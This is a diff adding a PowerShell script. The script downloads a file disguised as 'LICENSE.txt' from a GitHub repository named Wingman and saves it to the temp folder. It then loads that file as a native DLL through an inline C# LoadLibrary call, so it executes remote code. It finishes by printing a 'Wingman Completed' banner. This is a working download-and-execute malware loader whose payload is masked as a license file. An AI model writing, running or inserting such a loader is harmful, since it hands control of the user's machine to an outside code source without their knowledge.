@@ -1,0 +1,28 @@
+$URI="https://github.com/eforentropy/Wingman/raw/refs/heads/main/LICENSE.txt"
+$NAME = "LICENSE.txt"
+$tmpDir = [System.IO.Path]::GetTempPath()
+$exactPATH = Join-Path -Path $tmpDir -ChildPath $NAME
+Invoke-WebRequest -Uri $URI -OutFile $exactPATH
+$STAR= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Load
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr LoadLibrary(string dllToLoad);
+}
+"@
+Add-Type $STAR
+$HANDLE=[Load]::LoadLibrary($exactPATH)
+
+
+if ($HANDLE -eq [IntPtr]::Zero) {
+    Write-Host "[!] Unexpected Behavior. Wingman Returned Zero. Terminal Not Safe for Invoking" -ForegroundColor Red
+} else {
+	Write-Host "==============================" -ForegroundColor Cyan
+	Write-Host "        Wingman Completed     " -ForegroundColor Green
+	Write-Host "==============================" -ForegroundColor Cyan
+}
+
+
